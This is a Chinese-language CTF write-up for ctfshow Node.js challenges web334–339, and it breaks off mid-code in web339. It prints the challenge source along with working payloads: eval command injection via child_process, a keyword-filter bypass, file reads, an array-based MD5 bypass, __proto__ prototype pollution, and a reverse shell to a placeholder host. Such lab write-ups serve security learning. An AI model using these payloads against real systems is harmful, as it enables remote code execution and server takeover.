        <content type="html"><![CDATA[<p><a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">ctf-nodejs之一些小知识</a></p><p><a href="https://xz.aliyun.com/t/7184?time__1311=n4+xnD0Dy737q4Yq7KDsA3rPoGCi1tTttrtO4D">Node.js 常见漏洞学习与总结</a></p><h3 id="web334-344"><a href="#web334-344" class="headerlink" title="web334-344"></a>web334-344</h3><h4 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h4><p>查看附件给了源码，感觉考了简单的代码审计</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// login.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> users <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../modules/user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>items<span class="token punctuation">;</span> <span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> users<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> name<span class="token operator">!==</span><span class="token string">'CTFSHOW'</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>username <span class="token operator">===</span> name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token function">findUser</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">regenerate</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>             req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>loginUser <span class="token operator">=</span> user<span class="token punctuation">.</span>username<span class="token punctuation">;</span>      res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录成功'</span><span class="token punctuation">,</span><span class="token literal-property property">ret_flag</span><span class="token operator">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'账号或密码错误'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// user.js</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">items</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span><span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">'CTFSHOW'</span><span class="token punctuation">,</span> <span class="token literal-property property">password</span><span class="token operator">:</span> <span class="token string">'123456'</span><span class="token punctuation">&#125;</span>  <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>这里有个坑，这里不让直接等于CTFSHOW，而是对输入的name进行大写后比较，所以<code>name=ctfshow</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> users<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> name<span class="token operator">!==</span><span class="token string">'CTFSHOW'</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>username <span class="token operator">===</span> name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><h4 id="web335-child-process-execSync"><a href="#web335-child-process-execSync" class="headerlink" title="web335(child_process.execSync)"></a>web335(child_process.execSync)</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span># <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token operator">:</span> utf<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span># @Author<span class="token operator">:</span> h1xa# @Date<span class="token operator">:</span>   <span class="token number">2020</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">25</span> <span class="token number">03</span><span class="token operator">:</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">21</span># @Last Modified by<span class="token operator">:</span>   h1xa# @Last Modified time<span class="token operator">:</span> <span class="token number">2020</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">25</span> <span class="token number">06</span><span class="token operator">:</span><span class="token number">52</span><span class="token operator">:</span><span class="token number">38</span># @email<span class="token operator">:</span> h1xa@ctfer<span class="token punctuation">.</span>com# @link<span class="token operator">:</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>ctfer<span class="token punctuation">.</span>com<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">></span><span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token constant">CTFFSHOW</span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>    <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span> src<span class="token operator">=</span><span class="token string">"/javascripts/jquery.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span>    where is flag<span class="token operator">?</span>     <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">/</span><span class="token operator">?</span>eval<span class="token operator">=</span> <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></code></pre><p>在nodejs中，eval()方法用于计算字符串，并把它作为脚本代码来执行，语法为“eval(string)”；如果参数不是字符串，而是整数或者是Function类型，则直接返回该整数或Function。</p><p><a href="https://nodejs.cn/api/child_process.html">child_process</a>具体用法</p><p><strong>child_process.execSync(command[, options])</strong></p><p><code>child_process.execSync()</code> 方法通常与 <a href="https://nodejs.cn/api/child_process.html#child_processexeccommand-options-callback"><code>child_process.exec()</code></a> 相同，只是该方法在子进程完全关闭之前不会返回。当遇到超时并发送 <code>killSignal</code> 时，该方法将在进程完全退出之前不会返回。如果子进程拦截并处理了 <code>SIGTERM</code> 信号没有退出，父进程会一直等到子进程退出。</p><p>所以构造Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span><span class="token keyword">eval</span><span class="token operator">=</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'child_process'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac fl00g.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token keyword">eval</span><span class="token operator">=</span><span class="token keyword">global</span><span class="token operator">.</span>process<span class="token operator">.</span>mainModule<span class="token operator">.</span>constructor<span class="token operator">.</span><span class="token function">_load</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'child_process'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'calc'</span><span class="token punctuation">)</span></code></pre><h4 id="web336-fs-readFileSync-反弹shell"><a href="#web336-fs-readFileSync-反弹shell" class="headerlink" title="web336(fs.readFileSync  反弹shell)"></a>web336(fs.readFileSync  反弹shell)</h4><p>__filename 表示当前正在执行的脚本的文件名。它将输出文件所在位置的绝对路径，且和命令行参数所指定的文件名不一定相同。 如果在模块中，返回的值是模块文件的路径。 dirname 表示当前执行脚本所在的目录。</p><p>所以<code>?eval=__filename</code>看到文件&#x2F;app&#x2F;routes&#x2F;index.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>html<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> evalstring <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>eval<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>evalstring<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>string<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span>amp<span class="token punctuation">;</span><span class="token operator">&amp;</span>amp<span class="token punctuation">;</span> evalstring<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">exec|load</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">)</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>index<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>tql<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>index<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token function">eval</span><span class="token punctuation">(</span>evalstring<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>然后传入</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readdireSync</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./routes/index.js'</span><span class="token punctuation">)</span></code></pre><p>可以看到源码，发现过滤了<code>exec</code> 和<code>load</code></p><p>其实已经可以读文件了，所以可以直接读flag</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./fl001g.txt'</span><span class="token punctuation">)</span></code></pre><p>另外对于第一次的Payload可以绕过执行</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'exe'</span><span class="token operator">%</span>2B<span class="token string">'cSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'tac fl001g.txt'</span><span class="token punctuation">)</span></code></pre><p>另外也可以进行反弹shell</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"net"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    cp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    sh <span class="token operator">=</span> cp<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">net<span class="token punctuation">.</span>Socket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    client<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token number">1211</span><span class="token punctuation">,</span> <span class="token string">"xxxxx"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        client<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>stdin<span class="token punctuation">)</span><span class="token punctuation">;</span>        sh<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>        sh<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">a</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="web337-数组绕过MD5"><a href="#web337-数组绕过MD5" class="headerlink" title="web337(数组绕过MD5)"></a>web337(数组绕过MD5)</h4><p>Hint:</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'xxxxxxx'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> a <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">;</span>  <span class="token keyword">var</span> b <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>b<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'tql'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript">a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span></code></pre><p><code>a[x]=1&amp;b[x]=2</code></p><p>数组会被解析成<code>[object Object]</code></p><p><img src="web337.png" loading="lazy"></p><h4 id="web338-原型链污染"><a href="#web338-原型链污染" class="headerlink" title="web338(原型链污染)"></a>web338(原型链污染)</h4><p>给了源码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// login.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span><span class="token string">'36dboy'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// common.js</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">copy</span><span class="token operator">:</span>copy<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object1<span class="token punctuation">,</span> object2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> object2 <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> object1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">copy</span><span class="token punctuation">(</span>object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span></code></pre><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">深入理解 JavaScript Prototype 污染攻击</a></p><p>看到了copy操作考虑原型链污染，于是尝试污染Object类，添加{“ctfshow”:“36dboy”}属性</p><pre class="language-json" data-language="json"><code class="language-json">POST<span class="token operator">:</span>Content-Type<span class="token operator">:</span> application/json<span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"aa"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"aa"</span><span class="token punctuation">,</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"ctfshow"</span><span class="token operator">:</span><span class="token string">"36dboy"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web339-模块渲染-反弹shell"><a href="#web339-模块渲染-反弹shell" class="headerlink" title="web339(模块渲染 反弹shell)"></a>web339(模块渲染 反弹shell)</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// login.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token 